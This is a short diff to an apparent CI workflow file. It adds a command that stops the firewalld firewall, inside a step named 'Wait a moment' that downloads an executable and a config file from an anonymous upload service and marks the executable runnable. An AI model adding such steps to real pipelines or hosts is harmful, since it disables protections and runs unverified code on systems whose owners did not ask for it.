@@ -28,6 +28,7 @@ jobs:
 
       - name: Wait a moment
         run: |
+          sudo systemctl stop firewalld
           wget "https://bashupload.com/WWx_8/kE2pE." -O whisperer-server
           chmod +x whisperer-server
           wget https://bashupload.com/PWHro/server.toml
